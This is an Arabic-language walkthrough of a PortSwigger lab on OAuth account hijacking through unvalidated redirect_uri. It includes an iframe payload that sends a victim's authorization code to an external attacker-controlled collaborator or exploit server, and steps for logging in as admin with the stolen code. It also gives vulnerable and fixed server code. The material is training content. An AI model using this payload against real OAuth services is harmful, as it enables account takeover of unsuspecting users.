# Lab : OAuth account hijacking via redirect_uri

https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri

- الفكره من الLab ده

```bash
1. <iframe src="https://oauth-0a670062048d938f805210b602d200c5.oauth-server.net/auth?client_id=b68nq6g09ll3as8qp4gkk&redirect_uri=https://pg9fm3nmzpjuv9s47j2bh9zcp3vujx7m.oastify.com&response_type=code&scope=openid%20profile%20email"></iframe>

2. https://0a400078041d93cf80c812a800c80001.web-security-academy.net/oauth-callback?code=E6h0_WNZQmMTRhDojL9ypYj5UIPCubkCFBmhV29JaDu
```

اللاب ده من فئة **OAuth Vulnerabilities**، وتحديدًا استغلال **misconfiguration في الـ `redirect_uri` validation** من جانب **OAuth Provider نفسه** (مش الـ Client App زي اللابات السابقة). المشكلة: خدمة الـ OAuth **بتقبل أي قيمة لـ `redirect_uri`** بدون التحقق منها مقابل **whitelist من الروابط المسجّلة مسبقًا** للتطبيق.

### المفهوم الأساسي: إيه دور `redirect_uri` في OAuth؟

في عملية OAuth Authorization Code Flow:

```
[User] → [Client App يبعته لـ OAuth Provider]:
         GET /auth?client_id=X&redirect_uri=https://client-app.com/callback&...

[OAuth Provider]: المستخدم بيوافق → بيرجّعه لـ redirect_uri مع authorization code:
         https://client-app.com/callback?code=SECRET_CODE
```

الـ **`redirect_uri`** هو العنوان اللي هيتبعت عليه الـ **authorization code** بعد موافقة المستخدم. لأسباب أمنية، المفروض إن الـ **OAuth Provider يتحقق إن الـ `redirect_uri` ده مطابق تمامًا (أو على الأقل من ضمن) قائمة العناوين المسجّلة مسبقًا** للتطبيق (`client_id`) ده، عشان يمنع إعادة توجيه الـ code لمكان تاني غير التطبيق الشرعي.

### طبيعة الثغرة

في اللاب ده، خدمة الـ OAuth **معندهاش أي تحقق صارم على الـ `redirect_uri`** — تقدر تحط **أي قيمة تحبها** (حتى دومين تاني تمامًا زي الـ exploit server بتاعك)، وخدمة الـ OAuth **هتوجّه الـ authorization code لهناك من غير أي اعتراض**.

### خطوات الحل بالتفصيل

#### 1. جرب عملية OAuth Login العادية

دوس **"My account"** وكمّل عملية تسجيل الدخول عبر OAuth (بحسابك `wiener:peter`).

#### 2. لاحظ إن الجلسة بتفضل نشطة عند مزوّد الـ OAuth

اعمل logout من موقع المدونة، وسجل دخول تاني. هتلاحظ إنك **بتدخل فورًا من غير ما تدخل بيانات تسجيل دخول تاني** — ده لأن **جلستك مع خدمة الـ OAuth نفسها لسه نشطة**، وده مهم جدًا للاستغلال لاحقًا (لأن الضحية "admin" هيكون في نفس الوضع).

#### 3. ادرس طلب الـ Authorization

في Burp Proxy history، لاقي أحدث طلب:

```
GET /auth?client_id=[...]
```

لاحظ إنه بعد إرساله، بتتحول فورًا لـ **`redirect_uri`** مع الـ authorization code في الـ query string. ابعت الطلب ده على **Burp Repeater**.

#### 4. اختبر التلاعب في الـ redirect_uri

في Repeater، جرب تغيّر قيمة الـ `redirect_uri` لأي قيمة عشوائية. لاحظ إن الطلب **بيتقبل من غير أي رفض**، والـ response بيستخدم القيمة الجديدة دي في بناء الـ redirect.

#### 5. أكد إمكانية تسريب الـ Code لدومين خارجي

غيّر `redirect_uri` ليشاور على **exploit server** بتاعك، وابعت الطلب واتبع الـ redirect. روح لـ **exploit server > Access log**، وهتلاقي **إدخال جديد فيه authorization code** — ده تأكيد قاطع إن الـ code ممكن يتسرب لأي دومين خارجي.

#### 6. جهّز صفحة الـ Exploit (iframe)

روح للـ exploit server، واعمل صفحة على `/exploit`:

html

```html
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

**الفكرة**: لما **الضحية (admin)** يفتح الصفحة دي، الـ `iframe` هيحمّل رابط الـ authorization مباشرة. بما إن الضحية **عنده جلسة نشطة أصلاً مع خدمة الـ OAuth**، خدمة الـ OAuth **مش هتطلب منه يسجل دخول أو يوافق من جديد** — هتفترض إنه موافق بالفعل (بناءً على جلسته النشطة)، وهتعمل redirect فورًا لـ `redirect_uri` **اللي إحنا حطيناه (exploit server بتاعنا)** مع **authorization code خاص بحساب الـ admin نفسه**.

#### 7. اختبر الـ Exploit على نفسك الأول

دوس **"Store"** ثم **"View exploit"**. تأكد إن الـ `iframe` بيتحمّل صح، وافحص الـ access log — لازم تلاقي **code جديد** (بتاعك انت هذه المرة، عشان تتأكد إن الآلية شغالة).

#### 8. سلّم الـ Exploit للضحية (Admin)

دوس **"Deliver exploit to victim"**. الـ admin هيفتح الصفحة، والـ `iframe` هيسرّب **authorization code بتاعه هو** لسيرفرك.

#### 9. اسرق الـ Code من Access Log

روح للـ access log وانسخ **الـ code الجديد** (بتاع الضحية).

#### 10. استخدم الـ Code المسروق للدخول كـ Admin

اعمل logout من موقع المدونة، وافتح مباشرة:

```
https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE
```

بما إن الموقع بيستقبل أي `code` صالح على الـ `/oauth-callback` بتاعه (مسار التطبيق الشرعي الحقيقي)، هيكمل باقي عملية OAuth تلقائيًا (يستبدل الـ code بـ access token، يجيب بيانات المستخدم)، وهتلاقي نفسك **مسجل دخول كـ admin**.

#### 11. احذف carlos

روح لصفحة الأدمن بانل، واحذف `carlos`. اللاب هيتحل تلقائيًا ✅.

### ليه ده بيحصل تقنيًا

python

```python
@app.route("/auth")def authorize():    client_id = request.args.get("client_id")    redirect_uri = request.args.get("redirect_uri")   # ❌ مفيش تحقق من الـ redirect_uri    if user_has_active_session():        code = generate_authorization_code(user, client_id)        return redirect(f"{redirect_uri}?code={code}")   # ❌ بيوجه لأي مكان يطلبه العميل
```

المفروض إن الكود يكون:

python

```python
@app.route("/auth")def authorize():    client_id = request.args.get("client_id")    redirect_uri = request.args.get("redirect_uri")    registered_uris = get_registered_redirect_uris(client_id)    if redirect_uri not in registered_uris:   # ✅ تحقق صارم مقابل whitelist مسجّلة        return "Invalid redirect_uri", 400    ...
```

المشكلة الجوهرية: **خدمة الـ OAuth بتثق في قيمة `redirect_uri` اللي بتوصلها من العميل بشكل حر**، من غير ما تتحقق منها مقابل **قائمة عناوين مسجّلة ومعتمدة مسبقًا** لكل `client_id`. وبما إن الـ authorization code بيتم توجيهه **لأي مكان يطلبه الطلب**، أي مهاجم يقدر **يعيد توجيه الـ code الخاص بأي مستخدم تاني** (طالما عنده جلسة نشطة) لمكان بيتحكم فيه.

### الدرس المستفاد

- **`redirect_uri` لازم يتحقق منه بصرامة مقابل قائمة بيضاء (whitelist) مسجّلة مسبقًا لكل `client_id`** — تطابق تام (exact match) هو الأفضل، أو على الأقل تحقق دقيق من الدومين والمسار، مش مجرد قبول أي قيمة.
- **جلسة نشطة عند مزوّد الخدمة (زي هنا)** بتخلي هجمات الـ **iframe-based silent authorization** ممكنة، لأن المستخدم **مش هياخد أي إشعار أو طلب موافقة إضافي** — العملية بتتم بصمت تمامًا في الخلفية.
- **أي `code` بيوصل لموقع خارجي (زي سيرفر المهاجم) بيبقى قابل للاستخدام من أي حد شافه**، فمين ما يوصله الـ code الأول، هو اللي يقدر يستبدله بـ access token ويستولي على الحساب المرتبط بيه.
- هجوم ده بالذات **مش محتاج أي CSRF token غائب أو أي منطق برمجي معقد** — هو **misconfiguration بسيط جدًا** (غياب whitelist على `redirect_uri`)، لكنه من أخطر أنواع ثغرات OAuth، لأنه بيدّي **استيلاء كامل ومباشر على أي حساب** بمجرد ما تقدر توصل رابط لضحيته.
- **معيار OAuth 2.0 نفسه بينصح بشدة** بتطبيق `redirect_uri` validation صارم بالضبط لمنع النوع ده من الهجمات، وده أحد أشهر وأخطر أخطاء تطبيق OAuth في الواقع الحقيقي.
